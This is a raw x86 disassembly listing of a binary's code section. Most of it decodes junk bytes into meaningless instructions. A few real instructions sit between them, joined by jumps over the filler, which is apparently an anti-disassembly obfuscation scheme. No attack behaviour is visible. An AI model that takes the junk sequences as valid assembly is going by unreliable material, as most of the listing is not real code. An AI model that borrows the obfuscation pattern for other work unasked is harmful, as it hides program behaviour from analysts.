  42c53d:	xchg   esp,eax
  42c53e:	add    BYTE PTR ds:0x847440b5,dl
  42c544:	aam    0xb8
  42c546:	pop    ecx
  42c547:	mov    esi,esi
  42c549:	int    0xa1
  42c54b:	push   ebp
  42c54c:	mov    bh,0x90
  42c54e:	jae    0x42c538
  42c550:	icebp  
  42c551:	and    DWORD PTR [esi-0x56],ecx
  42c554:	cmp    BYTE PTR [edi-0x56c71960],dl
  42c55a:	jl     0x42c4f8
  42c55c:	arpl   WORD PTR [eax-0x6e6a6c72],bp
  42c562:	push   edx
  42c563:	jo     0x42c4e5
  42c565:	dec    edi
  42c566:	lea    eax,[esp+eiz*4-0x7e3acfff]
  42c56d:	xor    esp,esp
  42c56f:	outs   dx,DWORD PTR ds:[esi]
  42c570:	xchg   esp,eax
  42c571:	jmp    0x46ea:0x4f9bc872
  42c578:	and    al,0x7d
  42c57a:	mov    cl,0xdf
  42c57c:	nop
  42c57d:	repz pop edi
  42c57f:	(bad)  [eax-0x30]
  42c582:	inc    edi
  42c583:	pop    edi
  42c584:	xchg   ebx,eax
  42c585:	in     al,dx
  42c586:	in     eax,0xc
  42c588:	lea    edx,[ebx-0x51]
  42c58b:	data16 cld 
  42c58d:	icebp  
  42c58e:	lods   eax,DWORD PTR ds:[esi]
  42c58f:	je     0x42c5ea
  42c591:	in     al,0xfa
  42c593:	pop    es
  42c594:	in     al,0xe5
  42c596:	sbb    esi,DWORD PTR [esi+0x396d852a]
  42c59c:	cmp    eax,0xf225034d
  42c5a1:	jp     0x42c601
  42c5a3:	dec    esp
  42c5a4:	jne    0x42c5da
  42c5a6:	pop    ss
  42c5a7:	outs   dx,DWORD PTR ds:[esi]
  42c5a8:	pushf  
  42c5a9:	push   cs
  42c5aa:	ja     0x42c5bd
  42c5ac:	(bad)  
  42c5ae:	cmp    esi,DWORD PTR [ecx+edx*4+0x326d35f7]
  42c5b5:	pop    ecx
  42c5b6:	pop    es
  42c5b7:	dec    ebx
  42c5b8:	xor    dh,bh
  42c5ba:	push   0xd
  42c5bc:	push   esi
  42c5bd:	xchg   edi,eax
  42c5be:	push   ecx
  42c5bf:	inc    ebp
  42c5c0:	dec    ebx
  42c5c1:	sbb    cl,BYTE PTR [eax+edi*8+0x1a0df5ed]
  42c5c8:	xchg   esi,eax
  42c5c9:	mov    bh,0x51
  42c5cb:	jno    0x42c63f
  42c5cd:	cwde   
  42c5ce:	mov    WORD PTR ss:[edx-0x44baec06],fs
  42c5d5:	mul    BYTE PTR [edx+0x7db0c4a1]
  42c5db:	retf   0xc96a
  42c5de:	pop    es
  42c5df:	call   0xd08b801e
  42c5e4:	pop    ebp
  42c5e5:	iret   
  42c5e6:	inc    esp
  42c5e7:	arpl   WORD PTR [ebx-0x2381e12f],dx
  42c5ed:	js     0x42c628
  42c5ef:	sub    eax,0x57e374b8
  42c5f4:	mov    edi,0x27aa40fd
  42c5f9:	jno    0x42c5bf
  42c5fb:	dec    eax
  42c5fc:	add    esp,ebx
  42c5fe:	lea    eax,[esp+0x74]
  42c602:	push   eax
  42c603:	lea    edi,[esp+0x6c]
  42c607:	call   0x4130e7
  42c60c:	jmp    0x42d682
  42c611:	jmp    0x42c6f1
  42c616:	rcl    DWORD PTR [ebp+0x24f704b5],cl
  42c61c:	repz xlat BYTE PTR ds:[ebx]
  42c61e:	xor    al,0x6b
  42c620:	mov    ecx,0x9fadc7de
  42c625:	sbb    al,0x35
  42c627:	adc    BYTE PTR [edx],al
  42c629:	add    bl,al
  42c62b:	add    BYTE PTR [eax],al
  42c62d:	add    al,dl
  42c62f:	inc    ebx
  42c630:	pop    eax
  42c631:	cdq    
  42c632:	aam    0x36
  42c634:	scas   al,BYTE PTR es:[edi]
  42c635:	cli    
  42c636:	sub    al,0xc8
  42c638:	out    0x0,al
  42c63a:	rol    DWORD PTR [eax+0x70],cl
  42c63d:	or     dh,al
  42c63f:	xchg   DWORD PTR [ebx+0x46a0081],edi
  42c645:	fist   DWORD PTR [edx-0x57]
  42c648:	mov    cl,0x10
  42c64a:	xchg   edi,eax
  42c64b:	dec    ebp
  42c64c:	pop    es
  42c64d:	iret   
  42c64e:	mov    esp,0x562d332f
  42c653:	scas   eax,DWORD PTR es:[edi]
  42c654:	(bad)  
  42c655:	fdivr  st(6),st
  42c657:	hlt    
  42c658:	test   al,0x2b
  42c65a:	ds test eax,0xdf99adf0
  42c660:	mov    eax,edx
  42c662:	mov    DWORD PTR [ebx-0x4c],edi
  42c665:	aad    0xa6
  42c667:	or     bl,bl
  42c669:	dec    esp
  42c66a:	cmp    eax,DWORD PTR [ecx-0x1dca7239]
  42c670:	xor    ebx,ebx
  42c672:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c673:	test   BYTE PTR [ebx+edx*1-0x2dad0bc4],cl
  42c67a:	pop    edx
  42c67b:	sbb    BYTE PTR [edi],cl
  42c67d:	jnp    0x42c6ec
  42c67f:	rcr    DWORD PTR [esi+edi*1],cl
  42c682:	jnp    0x42c66b
  42c684:	fcom   QWORD PTR [edx]
  42c686:	jns    0x42c6a8
  42c688:	sbb    BYTE PTR [ebx+0x5bd22f76],bh
  42c68e:	add    DWORD PTR [ecx],edx
  42c690:	clc    
  42c691:	dec    ebx
  42c692:	mov    bl,0x80
  42c694:	dec    ebp
  42c695:	jne    0x42c620
  42c697:	or     al,0x8
  42c699:	(bad)  [ebx]
  42c69b:	mov    esi,0x231b5ce5
  42c6a0:	lods   al,BYTE PTR ds:[esi]
  42c6a1:	inc    DWORD PTR [edi+ecx*4-0x13]
  42c6a5:	xchg   ecx,eax
  42c6a6:	and    BYTE PTR [eax],bl
  42c6a8:	push   di
  42c6aa:	push   ss
  42c6ab:	sar    DWORD PTR [ebx+0x64],1
  42c6ae:	popa   
  42c6af:	jecxz  0x42c676
  42c6b1:	hlt    
  42c6b2:	xor    BYTE PTR [ebx-0x46cb1060],0x3c
  42c6b9:	pop    esp
  42c6ba:	loopne 0x42c68b
  42c6bc:	inc    ebp
  42c6bd:	cmp    BYTE PTR [esi-0x26da36fe],dl
  42c6c3:	dec    edx
  42c6c4:	cmp    ecx,DWORD PTR [eax-0x1c]
  42c6c7:	mov    bl,0x98
  42c6c9:	sub    al,0x27
  42c6cb:	mov    dl,0xe5
  42c6cd:	icebp  
  42c6ce:	in     al,dx
  42c6cf:	mov    esi,0x43dc483f
  42c6d4:	mov    edi,0x866fe5be
  42c6d9:	jp     0x42c67b
  42c6db:	fsub   QWORD PTR [esi+0x41]
  42c6de:	sbb    dl,BYTE PTR [edi+ecx*4+0x87824ab]
  42c6e5:	jg     0x42c6bb
  42c6e7:	call   0x20b76d8d
  42c6ec:	je     0x42c66e
  42c6ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c6ef:	xor    al,0xbc
  42c6f1:	mov    eax,DWORD PTR [esp+0x58]
  42c6f5:	jmp    0x42c7d5
  42c6fa:	inc    edx
  42c6fb:	mov    bh,0x8c
  42c6fd:	jge    0x42c6fc
  42c6ff:	jg     0x42c6f4
  42c701:	mov    edi,0xd51ae22
  42c706:	sub    BYTE PTR [ebp-0x24],ah
  42c709:	mov    eax,ds:0x210f8
  42c70e:	ret    
  42c70f:	add    BYTE PTR [eax],al
  42c711:	add    BYTE PTR [eax+0xc],dh
  42c714:	(bad)  
  42c715:	call   0x42970ec7
  42c71a:	(bad)  
  42c71b:	cmp    BYTE PTR [ebx-0x6091fca6],ch
  42c721:	in     al,dx
  42c722:	jae    0x42c6c2
  42c724:	lds    edx,FWORD PTR [ebp+edx*2-0x608b11b6]
  42c72b:	cmp    BYTE PTR [ebx-0x21],cl
  42c72e:	pop    edi
  42c72f:	mov    fs,WORD PTR [ebp-0x83c982b]
  42c735:	test   esp,ecx
  42c737:	push   edi
  42c738:	ret    
  42c739:	out    dx,eax
  42c73a:	push   esp
  42c73b:	mov    ds:0x1614f4ba,al
  42c740:	pop    esi
  42c741:	in     eax,dx
  42c742:	add    DWORD PTR [ecx],0x2458916b
  42c748:	and    bh,BYTE PTR [ebp-0x9]
  42c74b:	frstor [ebx+0x3a]
  42c74e:	mov    DWORD PTR [ebx-0x3bd32bae],eax
  42c754:	push   ds
  42c755:	jg     0x42c7b5
  42c757:	push   ss
  42c758:	jmp    0x42c7ab
  42c75a:	sub    eax,0xe2b5bafc
  42c75f:	inc    esp
  42c760:	call   0x8db763a2
  42c765:	or     bl,bl
  42c767:	mov    al,0x8c
  42c769:	xchg   edx,eax
  42c76a:	lods   al,BYTE PTR ds:[esi]
  42c76b:	mov    edx,0xd4dde654
  42c770:	data16 adc dl,BYTE PTR ds:0xb278e7f9
  42c777:	inc    ebp
  42c778:	(bad)  
  42c779:	mov    ebx,0x4375045a
  42c77e:	arpl   WORD PTR [ebx-0x7aaa8a2c],bx
  42c784:	gs mov esi,0x89b3f55
  42c78a:	fadd   DWORD PTR [edx+edi*8]
  42c78d:	add    eax,0xeb7ac208
  42c792:	dec    edi
  42c793:	icebp  
  42c794:	push   ecx
  42c795:	lods   eax,DWORD PTR ds:[esi]
  42c796:	jbe    0x42c7ee
  42c798:	add    DWORD PTR cs:[ecx],ebx
  42c79b:	pop    ebp
  42c79c:	pop    edx
  42c79d:	adc    DWORD PTR [ecx-0x4a30e5db],0x7f9a1ace
  42c7a7:	and    edi,eax
  42c7a9:	aam    0x1d
  42c7ab:	clc    
  42c7ac:	push   es
  42c7ad:	add    DWORD PTR [edx-0x1804affa],0x8c8a0f21
  42c7b7:	pop    ecx
  42c7b8:	nop
  42c7b9:	(bad)  
  42c7ba:	lea    ebp,[edi+edi*2+0x7ef1055b]
  42c7c1:	xchg   esp,eax
  42c7c2:	xlat   BYTE PTR ds:[ebx]
  42c7c3:	xor    BYTE PTR [edi-0x4bf595b5],cl
  42c7c9:	daa    
  42c7ca:	ret    
  42c7cb:	call   0x8bf529ac
  42c7d0:	dec    esi
  42c7d1:	adc    eax,0x8b4a15e3
  42c7d6:	dec    esp
  42c7d7:	and    al,0x5c
  42c7d9:	mov    edx,DWORD PTR [esp+0x10]
  42c7dd:	jmp    0x42c8bd
  42c7e2:	and    DWORD PTR [ebp-0x22136314],ebp
  42c7e8:	jno    0x42c7a7
  42c7ea:	sahf   
  42c7eb:	and    DWORD PTR [esi+ebx*8-0x77],ebp
  42c7ef:	add    eax,0x11bbe4f3
  42c7f4:	add    al,BYTE PTR [eax]
  42c7f6:	ret    
  42c7f7:	add    BYTE PTR [eax],al
  42c7f9:	add    BYTE PTR [ecx-0xc],al
  42c7fc:	mov    bh,0xda
  42c7fe:	xchg   ecx,eax
  42c7ff:	and    BYTE PTR [esi+ecx*8-0xf2ba740],dh
  42c806:	jmp    0x42c7fb
  42c808:	es pop edx
  42c80a:	cwde   
  42c80b:	in     ax,dx
  42c80d:	and    ecx,DWORD PTR [edx]
  42c80f:	add    BYTE PTR [ecx+eiz*8+0x50],ch
  42c813:	mov    esp,0x6606c086
  42c818:	mov    BYTE PTR [ebx],dl
  42c81a:	push   0xffffff96
  42c81c:	repz sub ch,BYTE PTR [ecx-0x36]
  42c820:	jns    0x42c7da
  42c822:	add    esi,ecx
  42c824:	mov    esi,0x71ccc012
  42c829:	sub    eax,0x8c32364b
  42c82e:	adc    edi,DWORD PTR [ebx+0x38]
  42c831:	mov    edi,0xd458bda9
  42c836:	rol    ebx,1
  42c838:	or     al,0xcb
  42c83a:	pop    ds
  42c83b:	js     0x42c89b
  42c83d:	aas    
  42c83e:	push   esp
  42c83f:	cmp    DWORD PTR [edx+0x1f],0x3e24539d
  42c846:	sbb    dl,BYTE PTR [edi+eax*2]
  42c849:	int    0x9b
  42c84b:	dec    edx
  42c84c:	cmp    eax,0x23f558d2
  42c851:	push   ss
  42c852:	xor    ch,0x7a
  42c855:	push   ecx
  42c856:	stos   BYTE PTR es:[edi],al
  42c857:	mov    dl,cl
  42c859:	inc    ecx
  42c85a:	sub    dl,BYTE PTR [edi]
  42c85c:	lods   eax,DWORD PTR ds:[esi]
  42c85d:	xor    ah,BYTE PTR [edx+0x4875459b]
  42c863:	xchg   ebx,eax
  42c864:	sub    ebx,DWORD PTR [eax]
  42c866:	inc    ecx
  42c867:	or     edi,DWORD PTR ds:0x3a91fb85
  42c86d:	and    eax,0x19d0d88e
  42c872:	sbb    ah,ch
  42c874:	iret   
  42c875:	pop    edx
  42c876:	jb     0x42c8a9
  42c878:	adc    eax,0x5b305846
  42c87d:	sub    eax,0xb8acf664
  42c882:	sbb    eax,0x67ac7aa0
  42c887:	outs   dx,DWORD PTR ds:[esi]
  42c888:	inc    ecx
  42c889:	mov    edi,0x16e8b671
  42c88e:	outs   dx,DWORD PTR ds:[esi]
  42c88f:	push   es
  42c890:	sbb    BYTE PTR [ecx-0x65],al
  42c893:	ret    0xd4f2
  42c896:	mov    cl,bl
  42c898:	or     cl,BYTE PTR [edx]
  42c89a:	pop    edx
  42c89b:	mov    cl,0x40
  42c89d:	fild   DWORD PTR [edi+0x11]
  42c8a0:	retf   
  42c8a1:	xor    cl,BYTE PTR [ecx+0x6b98295e]
  42c8a7:	fadd   st(5),st
  42c8a9:	(bad)  
  42c8aa:	test   al,0x16
  42c8ac:	cmp    BYTE PTR [esi],dh
  42c8ae:	stos   BYTE PTR es:[edi],al
  42c8af:	sti    
  42c8b0:	mov    esi,0x1394559d
  42c8b5:	or     al,BYTE PTR [esi+0x6b]
  42c8b8:	int3   
  42c8b9:	scas   eax,DWORD PTR es:[edi]
  42c8ba:	stos   DWORD PTR es:[edi],eax
  42c8bb:	jbe    0x42c8c4
  42c8bd:	mov    esi,DWORD PTR [esp+0x14]
  42c8c1:	add    eax,edx
  42c8c3:	jmp    0x42c9a3
  42c8c8:	mov    ds:0x6b950ac3,al
  42c8cd:	fnstsw WORD PTR [edi+0xbd1dcf7]
  42c8d3:	xchg   ebp,eax
  42c8d4:	jge    0x42c89e
  42c8d6:	mov    ebp,0x2127e38
  42c8db:	add    bl,al
  42c8dd:	add    BYTE PTR [eax],al
  42c8df:	add    dl,dl
  42c8e1:	cdq    
  42c8e2:	add    edi,DWORD PTR [edx]
  42c8e4:	nop
  42c8e5:	mov    ds:0xda961cb3,eax
  42c8ea:	das    
  42c8eb:	dec    ebx
  42c8ec:	lahf   
  42c8ed:	pop    eax
  42c8ee:	and    DWORD PTR [ecx+0x6a8d9ae],edi
  42c8f4:	xchg   BYTE PTR [eax+0x6075659b],bh
  42c8fa:	retf   
  42c8fb:	mov    bl,0x1e
  42c8fd:	cmp    eax,0x29e2e55
  42c902:	add    cl,BYTE PTR [esi+edi*8-0x4e28c]
  42c909:	shl    ebp,cl
  42c90b:	gs mov edi,0xd5a74997
  42c911:	lods   al,BYTE PTR ds:[esi]
  42c912:	out    dx,eax
  42c913:	mov    al,ds:0xc1597b5
  42c918:	sbb    eax,0x87fbecde
  42c91d:	mov    al,0xb6
  42c91f:	movsx  edx,WORD PTR [eax-0x6b4dd043]
  42c926:	jmp    0x1306c236
  42c92b:	xchg   esp,eax
  42c92c:	mov    cs,WORD PTR gs:[ebx-0x6f]
  42c930:	leave  
  42c931:	jecxz  0x42c946
  42c933:	dec    esi
  42c934:	sub    BYTE PTR [edx],cl
  42c936:	sbb    DWORD PTR [ebp+0x3f],0x6fa23aa0
  42c93d:	and    eax,0x5827e1a
  42c942:	aaa    
  42c943:	adc    bl,BYTE PTR [ebp+0x68]
  42c946:	push   ebp
  42c947:	cld    
  42c948:	dec    eax
  42c949:	cs jecxz 0x42c8f9
  42c94c:	mov    bl,0x4d
  42c94e:	mov    ch,0x24
  42c950:	mov    ebx,0xe7759081
  42c955:	mov    cl,0x37
  42c957:	test   ebp,eax
  42c959:	pop    ss
  42c95a:	xchg   BYTE PTR [ebx],bh
  42c95c:	cmp    BYTE PTR [ebp+edi*8-0x7d53dda2],bh
  42c963:	lock stos BYTE PTR es:[edi],al
  42c965:	push   0x1ce040d2
  42c96a:	mov    ebx,0xc563c6cc
  42c96f:	stos   DWORD PTR es:[edi],eax
  42c970:	shl    DWORD PTR [ecx],1
  42c972:	in     al,0xd7
  42c974:	fistp  DWORD PTR [ebx]
  42c976:	ficomp WORD PTR [edx]
  42c978:	push   edx
  42c979:	sub    DWORD PTR [eax+0x454d9928],esp
  42c97f:	in     al,0xe6
  42c981:	xor    dh,BYTE PTR [ebx]
  42c983:	jbe    0x42c9ac
  42c985:	icebp  
  42c986:	ret    
  42c987:	lahf   
  42c988:	mov    al,ds:0x878c1ff6
  42c98d:	nop
  42c98e:	scas   al,BYTE PTR es:[edi]
  42c98f:	neg    ah
  42c991:	pop    edi
  42c992:	cmp    al,0x17
  42c994:	mov    esi,0x5f9ab3de
  42c999:	(bad)  
  42c99a:	or     bh,BYTE PTR [edi+0x3a]
  42c99d:	stc    
  42c99e:	daa    
  42c99f:	xlat   BYTE PTR ds:[ebx]
  42c9a0:	je     0x42c97e
  42c9a2:	scas   al,BYTE PTR es:[edi]
  42c9a3:	adc    ecx,esi
  42c9a5:	mov    DWORD PTR [esp+0x10],eax
  42c9a9:	jmp    0x42ca89
  42c9ae:	inc    edx
  42c9af:	call   0x9b47:0xdfded3d6
  42c9b6:	mov    esp,0xf4da054b
  42c9bb:	mov    al,0x21
  42c9bd:	aas    
  42c9be:	inc    ecx
  42c9bf:	adc    eax,DWORD PTR [edx]
  42c9c1:	add    bl,al
  42c9c3:	add    BYTE PTR [eax],al
  42c9c5:	add    BYTE PTR [ebp-0x627b4ab6],bl
  42c9cb:	pop    es
  42c9cc:	into   
  42c9cd:	sbb    ecx,DWORD PTR [ebx-0x4f]
  42c9d0:	inc    ebx
  42c9d1:	fisttp DWORD PTR [eax]
  42c9d3:	stos   BYTE PTR es:[edi],al
  42c9d4:	add    al,0xd5
  42c9d6:	addr16 in al,0x69
  42c9d9:	lahf   
  42c9da:	sti    
  42c9db:	cli    
  42c9dc:	inc    edx
  42c9dd:	add    DWORD PTR [esi],ebp
  42c9df:	push   cs
  42c9e0:	and    DWORD PTR [ecx],0xb58a42fb
  42c9e6:	out    0x45,eax
  42c9e8:	int3   
  42c9e9:	sbb    ch,BYTE PTR [ebx]
  42c9eb:	mov    DWORD PTR [ebp+0x2bc42d0d],0x37302870
  42c9f5:	test   BYTE PTR [edx-0x6bf92b95],dl
  42c9fb:	sub    eax,0xd6ecbf4d
  42ca00:	add    ebp,DWORD PTR [ebx-0x1c]
  42ca03:	pop    edi
  42ca04:	inc    ebp
  42ca05:	retf   
  42ca06:	push   ebp
  42ca07:	(bad)  [eax]
  42ca09:	pushf  
  42ca0a:	ror    edi,0x1b
  42ca0d:	sar    BYTE PTR [edi-0x33c14383],1
  42ca13:	or     bl,BYTE PTR [ecx-0x4c]
  42ca16:	hlt    
  42ca17:	mov    esp,esi
  42ca19:	push   eax
  42ca1a:	jns    0x42c99f
  42ca1c:	jmp    0x57f24a57
  42ca21:	lock adc DWORD PTR ds:[ebx+0x4c9e47cf],esp
  42ca29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ca2a:	sub    al,0x2c
  42ca2c:	adc    al,0x24
  42ca2e:	adc    BYTE PTR [ecx+ecx*4+0x4a83e2a3],dl
  42ca35:	jl     0x42ca35
  42ca37:	out    0xfc,eax
  42ca39:	aad    0xc9
  42ca3b:	out    dx,eax
  42ca3c:	pop    esp
  42ca3d:	add    al,0xe1
  42ca3f:	test   eax,0xcf61408c
  42ca44:	das    
  42ca45:	and    al,al
  42ca47:	pushf  
  42ca48:	jo     0x42ca31
  42ca4a:	inc    ebx
  42ca4b:	lock test eax,0xf66d7afa
  42ca51:	sub    dl,BYTE PTR [edx-0x70]
  42ca54:	mov    ah,0xdf
  42ca56:	push   edx
  42ca57:	inc    ecx
  42ca58:	or     bh,BYTE PTR [edi]
  42ca5a:	jns    0x42caba
  42ca5c:	inc    edx
  42ca5d:	js     0x42cab9
  42ca5f:	push   cs
  42ca60:	ja     0x42ca91
  42ca62:	dec    esp
  42ca63:	mov    edx,0xc42cb69a
  42ca68:	sub    eax,0x47251b6b
  42ca6d:	mov    ch,0xaf
  42ca6f:	xor    eax,DWORD PTR [esi+0x33646bbc]
  42ca75:	push   ebp
  42ca76:	jmp    0xc73dacca
  42ca7b:	adc    BYTE PTR [ebx+0x53],dh
  42ca7e:	or     al,0xff
  42ca80:	add    al,0x76
  42ca82:	mov    dh,ah
  42ca84:	fwait
  42ca85:	sar    BYTE PTR [edi+edi*8-0x4a],1
  42ca89:	mov    DWORD PTR [esp+0x14],ecx
  42ca8d:	jmp    0x42d682
  42ca92:	jmp    0x42cb72
  42ca97:	dec    ebx
  42ca98:	inc    DWORD PTR [ecx-0x80]
  42ca9b:	cmc    
  42ca9c:	mov    esi,0xf1c8ffcb
  42caa1:	je     0x42ca70
  42caa3:	mov    eax,ds:0x45ffd49
  42caa8:	adc    al,0x2
  42caaa:	add    bl,al
  42caac:	add    BYTE PTR [eax],al
  42caae:	add    bh,dl
  42cab0:	pusha  
  42cab1:	dec    ebx
  42cab2:	cmp    esp,edi
  42cab4:	adc    BYTE PTR [esi+0x24597423],ah
  42caba:	aad    0x32
  42cabc:	xchg   esi,eax
  42cabd:	mov    ds:0x2958e4a2,al
  42cac2:	cmp    DWORD PTR [edx+eiz*4],esp
  42cac5:	push   edi
  42cac6:	stc    
  42cac7:	stos   DWORD PTR es:[edi],eax
  42cac8:	xchg   ebx,eax
  42cac9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42caca:	mov    ds:0xfbf2992,al
  42cacf:	dec    ebp
  42cad0:	or     DWORD PTR [ecx+0x6d4d48a3],0x1dbc066c
  42cada:	sti    
  42cadb:	or     bl,BYTE PTR [ebx-0x2ff49aa1]
  42cae1:	ret    0x8ed6
  42cae4:	inc    edx
  42cae5:	mov    edx,DWORD PTR [edx+0x5f]
  42cae8:	pushf  
  42cae9:	sbb    al,BYTE PTR [edx-0x9]
  42caec:	inc    ecx
  42caed:	sub    ebp,ebx
  42caef:	shl    BYTE PTR [edi-0x51],0x60
  42caf3:	mov    esp,0xd0c436f2
  42caf8:	jecxz  0x42caec
  42cafa:	ror    BYTE PTR ds:0xfc3027f7,1
  42cb00:	in     eax,dx
  42cb01:	popf   
  42cb02:	sbb    BYTE PTR [eax+0x57],bh
  42cb05:	inc    ebx
  42cb06:	sub    esi,DWORD PTR [eax+ebx*4-0x27]
  42cb0a:	jne    0x42cb63
  42cb0c:	loop   0x42cb82
  42cb0e:	rcr    bh,1
  42cb10:	xchg   DWORD PTR [ebx+0x47c0fa53],ecx
  42cb16:	cmp    edx,DWORD PTR [esi-0x8f9c18e]
  42cb1c:	mov    DWORD PTR [esi],eax
  42cb1e:	add    al,dl
  42cb20:	cmp    ebx,DWORD PTR [ebp-0x79]
  42cb23:	aas    
  42cb24:	dec    eax
  42cb25:	fadd   DWORD PTR [ebp+0x67]
  42cb28:	xor    eax,0x7f7cf16b
  42cb2d:	jo     0x42cba4
  42cb2f:	mov    eax,ds:0xcfc4dab4
  42cb34:	frstor [edi]
  42cb36:	daa    
  42cb37:	cwde   
  42cb38:	and    eax,0xf3fc6eda
  42cb3d:	dec    ebp
  42cb3e:	hlt    
  42cb3f:	xor    al,0x18
  42cb41:	dec    ebx
  42cb42:	and    eax,0x180ab902
  42cb47:	xor    al,0x7a
  42cb49:	jmp    0x38346c0f
  42cb4e:	mov    ebp,0x78a9158f
  42cb53:	shr    DWORD PTR [edx-0x5f],cl
  42cb56:	add    dh,BYTE PTR [ebx]
  42cb58:	pop    edi
  42cb59:	inc    edi
  42cb5a:	mov    esi,0x29b2f82e
  42cb5f:	scas   eax,DWORD PTR es:[edi]
  42cb60:	xchg   si,ax
  42cb62:	int    0x9e
  42cb64:	jmp    0x42cb1d
  42cb66:	dec    edx
  42cb67:	std    
  42cb68:	dec    esp
  42cb69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cb6a:	xor    al,dl
  42cb6c:	mov    ecx,0x83fc010d
  42cb71:	push   esp
  42cb72:	push   0x4
  42cb74:	push   0x4331b4
  42cb79:	lea    eax,[esp+0x58]
  42cb7d:	push   eax
  42cb7e:	call   0x41d107
  42cb83:	mov    eax,DWORD PTR [esp+0x50]
  42cb87:	jmp    0x42cc67
  42cb8c:	cmp    BYTE PTR [esi],dl
  42cb8e:	or     ebx,DWORD PTR [eax]
  42cb90:	das    
  42cb91:	sbb    eax,0x9685363b
  42cb96:	xchg   ah,ah
  42cb98:	dec    ebp
  42cb99:	add    BYTE PTR [ebp+0x214c769],0x0
  42cba0:	ret    
  42cba1:	add    BYTE PTR [eax],al
  42cba3:	add    BYTE PTR [edx],dl
  42cba5:	adc    ebx,ebp
  42cba7:	lea    ebx,[ebx-0x27]
  42cbaa:	stos   BYTE PTR es:[edi],al
  42cbab:	std    
  42cbac:	into   
  42cbad:	jae    0x42cc17
  42cbaf:	jg     0x42cba1
  42cbb1:	pop    ebx
  42cbb2:	and    eax,0x17af6839
  42cbb7:	adc    ebx,ebp
  42cbb9:	pop    es
  42cbba:	add    al,0xa2
  42cbbc:	xor    al,0x67
  42cbbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cbbf:	mov    eax,0xc479549f
  42cbc4:	mov    ecx,0x11021674
  42cbc9:	dec    edx
  42cbca:	lods   eax,DWORD PTR ds:[esi]
  42cbcb:	retf   
  42cbcc:	pop    es
  42cbcd:	mov    al,ds:0xd5359ba2
  42cbd2:	cs cmp ecx,eax
  42cbd5:	pop    ebp
  42cbd6:	(bad)  
  42cbd7:	and    BYTE PTR [edx+0x5d],0x2f
  42cbdb:	dec    ecx
  42cbdc:	ja     0x42cba0
  42cbde:	pop    ecx
  42cbdf:	fcmovnu st,st(1)
  42cbe1:	sub    DWORD PTR [ebx],ebx
  42cbe3:	push   0xffffffc9
  42cbe5:	mov    dl,0x40
  42cbe7:	xchg   esi,eax
  42cbe8:	(bad)  
  42cbe9:	push   ss
  42cbea:	leave  
  42cbeb:	mov    ch,0xae
  42cbed:	lods   eax,DWORD PTR ds:[esi]
  42cbee:	xchg   dl,bh
  42cbf0:	sbb    edi,ebx
  42cbf2:	dec    esp
  42cbf3:	sbb    edx,DWORD PTR [eax+0x22567bed]
  42cbf9:	or     al,BYTE PTR [ebx+0x18]
  42cbfc:	ror    esp,1
  42cbfe:	ins    DWORD PTR es:[edi],dx
  42cbff:	(bad)  
  42cc00:	xor    al,0xad
  42cc02:	mov    dl,0x3c
  42cc04:	inc    esi
  42cc05:	sbb    DWORD PTR [eax-0x10c1997b],edi
  42cc0b:	ret    0x2cfa
  42cc0e:	mov    ebp,0x4df900d4
  42cc13:	xchg   edx,ecx
  42cc15:	dec    edi
  42cc16:	sub    eax,0x97e7472f
  42cc1b:	pushf  
  42cc1c:	jecxz  0x42cc2d
  42cc1e:	stc    
  42cc1f:	add    al,0xa2
  42cc21:	nop
  42cc22:	sbb    eax,0xbc7edef9
  42cc27:	and    eax,esp
  42cc29:	in     al,0x5a
  42cc2b:	fnstsw WORD PTR [eax]
  42cc2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cc2e:	mov    al,ds:0x726b6c15
  42cc33:	mov    esi,0x3e391d8f
  42cc38:	fisubr WORD PTR [ebx]
  42cc3a:	pushf  
  42cc3b:	dec    esp
  42cc3c:	int    0xf1
  42cc3e:	push   cs
  42cc3f:	add    al,bl
  42cc41:	sbb    eax,0x76eba053
  42cc46:	dec    edx
  42cc47:	xor    BYTE PTR [edx-0x15],dh
  42cc4a:	cli    
  42cc4b:	mov    ebx,0x23538ad7
  42cc50:	sub    ecx,DWORD PTR [edx+0x3c]
  42cc53:	push   esp
  42cc54:	lds    eax,FWORD PTR [eax+ecx*4-0x58]
  42cc58:	sti    
  42cc59:	pop    ebx
  42cc5a:	jl     0x42cc9f
  42cc5c:	cmp    ebx,DWORD PTR [edi+0x129a74b0]
  42cc62:	mov    WORD PTR [edx+0x40],ss
  42cc65:	inc    eax
  42cc66:	dec    esp
  42cc67:	push   0x4
  42cc69:	push   DWORD PTR [eax+0x194]
  42cc6f:	lea    eax,[esp+0x54]
  42cc73:	push   eax
  42cc74:	call   0x41d107
  42cc79:	mov    eax,DWORD PTR [esp+0x50]
  42cc7d:	mov    ecx,DWORD PTR [esp+0x50]
  42cc81:	mov    eax,DWORD PTR [eax+0x194]
  42cc87:	mov    eax,DWORD PTR [eax]
  42cc89:	jmp    0x42cd69
  42cc8e:	stos   DWORD PTR es:[edi],eax
  42cc8f:	jne    0x42cd00
  42cc91:	xchg   esi,eax
  42cc92:	call   FWORD PTR [esi+0x4aff7dfb]
  42cc98:	cmp    al,0xd
  42cc9a:	cmc    
  42cc9b:	jne    0x42ccde
  42cc9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cc9e:	mov    dl,BYTE PTR ds:0xc30002
  42cca4:	add    BYTE PTR [eax],al
  42cca6:	jnp    0x42cc2e
  42cca8:	push   esi
  42cca9:	push   0xfffffff4
  42ccab:	dec    ecx
  42ccac:	sbb    eax,0x293218ae
  42ccb1:	loop   0x42cd14
  42ccb3:	call   0x46645c75
  42ccb8:	and    BYTE PTR [ecx-0x5d4c145b],dl
  42ccbe:	fmul   QWORD PTR [ecx-0x7c]
  42ccc1:	push   cs
  42ccc2:	stos   DWORD PTR es:[edi],eax
  42ccc3:	xchg   edi,eax
  42ccc4:	in     eax,dx
  42ccc5:	fimul  WORD PTR [ebp+0x10]
  42ccc8:	sbb    ebp,ebx
  42ccca:	lds    eax,FWORD PTR [edx-0x2a0bb57]
  42ccd0:	loope  0x42ccf7
  42ccd2:	test   eax,0x968fc636
  42ccd7:	jb     0x42cca6
  42ccd9:	out    dx,eax
  42ccda:	sbb    al,0xda
  42ccdc:	mov    bl,0x0
